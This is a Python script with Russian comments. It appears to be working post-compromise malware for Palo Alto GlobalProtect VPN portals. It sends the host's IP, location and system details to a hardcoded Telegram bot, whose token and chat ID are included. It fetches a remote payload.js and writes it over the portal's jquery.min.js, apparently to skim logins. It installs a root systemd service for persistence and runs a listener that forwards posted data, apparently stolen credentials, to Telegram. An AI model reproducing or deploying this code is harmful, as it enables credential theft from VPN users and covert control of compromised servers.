import subprocess
import sys
import os
import hashlib
import platform
import requests
from time import sleep
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# Функция для установки необходимого пакета
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Сначала проверяем и устанавливаем необходимые пакеты
required_packages = ['requests']

for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install(package)

# Теперь можно импортировать пакеты
import requests

# Токен и Chat ID для Telegram
bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'
chat_id = '-1002252120859'

# Функция для получения публичного IP
def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        if response.status_code == 200:
            return response.json().get('ip')
        else:
            return None
    except requests.exceptions.RequestException as e:
        print(f"Error obtaining public IP: {e}")
        return None

# Функция для получения геолокации по IP
def get_ip_geolocation(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        if response.status_code == 200:
            data = response.json()
            return data.get('country', 'Unknown'), data.get('city', 'Unknown')
        else:
            return 'Unknown', 'Unknown'
    except requests.exceptions.RequestException as e:
        print(f"Error obtaining geolocation: {e}")
        return 'Unknown', 'Unknown'

# Функция для хеширования IP (используется публичный IP сервера)
def hash_ip(ip):
    return hashlib.sha256(ip.encode('utf-8')).hexdigest()

# Функция для отправки сообщений в Telegram
def send_message_to_telegram(message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    params = {'chat_id': chat_id, 'text': message}
    try:
        response = requests.post(url, params=params, verify=False)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message: {e}")

# Системная информация для отправки в первый запрос
def get_system_info():
    system_info = {
        "Platform": platform.system(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Architecture": platform.architecture(),
        "Machine": platform.machine(),
        "Processor": platform.processor()
    }
    return "\n".join([f"{key}: {value}" for key, value in system_info.items()])

# Подмена файла (ссылка на файл для загрузки)
def replace_script_file():
    url = 'https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/payload.js'
    file_path = '/var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js'
    try:
        response = requests.get(url, verify=False)
        if response.status_code == 200:
            with open(file_path, 'w') as file:
                file.write(response.text)
            print(f"File {file_path} successfully replaced.")
        else:
            print(f"Failed to download the script. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error replacing the file: {e}")

# Класс для обработки HTTP-запросов
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Чтение данных запроса
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Преобразуем данные в строку
        message = post_data.decode('utf-8')

        if message:
            # Получаем публичный IP и хешируем его
            public_ip = get_public_ip()
            if public_ip:
                hashed_ip = hash_ip(public_ip)
                # Добавляем хешированный IP в конец сообщения
                message += f"\n#{hashed_ip}"

                # Отправляем сообщение в Telegram
                send_message_to_telegram(message)

                # Отправляем ответ на запрос
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"Message received and sent to Telegram.")
            else:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b"Failed to retrieve public IP.")
        else:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"No message received.")

# Запуск HTTP-сервера
def run_server():
    server_address = ('0.0.0.0', 8888)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    print("Server started on port 8888...")
    httpd.serve_forever()

# Устанавливаем автозапуск текущего скрипта
def setup_autostart():
    script_path = os.path.abspath(__file__)
    autostart_script = f"""
    [Unit]
    Description=Telegram Proxy Server

    [Service]
    ExecStart={sys.executable} {script_path}
    Restart=always
    User=root
    Group=root
    WorkingDirectory={os.path.dirname(script_path)}

    [Install]
    WantedBy=multi-user.target
    """
    
    # Сохраняем в systemd файл автозапуска
    systemd_path = '/etc/systemd/system/telegram_proxy.service'
    with open(systemd_path, 'w') as f:
        f.write(autostart_script)
    
    # Активируем сервис для автозапуска
    subprocess.run(["systemctl", "daemon-reload"])
    subprocess.run(["systemctl", "enable", "telegram_proxy.service"])
    subprocess.run(["systemctl", "start", "telegram_proxy.service"])

    # Проверка, что сервис активен
    return check_autostart_status()

def check_autostart_status():
    try:
        status = subprocess.run(["systemctl", "is-active", "telegram_proxy.service"], capture_output=True, text=True)
        if status.returncode == 0 and status.stdout.strip() == 'active':
            return '✅'  # Успех
        else:
            return '❌'  # Ошибка
    except subprocess.CalledProcessError as e:
        print(f"Error checking autostart status: {e}")
        return '❌'  # Ошибка

if __name__ == '__main__':
    # Получаем публичный IP
    public_ip = get_public_ip()

    if public_ip:
        # Получаем геолокацию по IP
        country, city = get_ip_geolocation(public_ip)

        # Получаем системную информацию
        system_info = get_system_info()

        # Хешируем публичный IP для добавления в хештег
        hashed_ip = hash_ip(public_ip)

        # Проверяем статус автозапуска и получаем иконку
        autostart_status_icon = setup_autostart()

        # Составляем первое сообщение
        initial_message = f"""
        📍 **Server Information:**

        - **User**: {os.getenv("USER", "Unknown")}
        - **IP**: {public_ip}
        - **Country**: {country}
        - **City**: {city}
        
        📊 **System Information:**
        {system_info}

        🔐 **Hashed IP**: #{hashed_ip}
        
        🚀 **Autostart Status**: {autostart_status_icon}
        """

        # Отправляем первое сообщение в Telegram
        send_message_to_telegram(initial_message)

    # Подменяем файл скрипта
    replace_script_file()

    # Запускаем сервер для прослушивания сообщений
    server_thread = Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    print("Server started on port 8888, listening for messages...")
    print("Autostart has been set up successfully.")
    
    # Бесконечный цикл для поддержания работы
    while True:
        sleep(3600)  # Просто поддерживаем работу скрипта
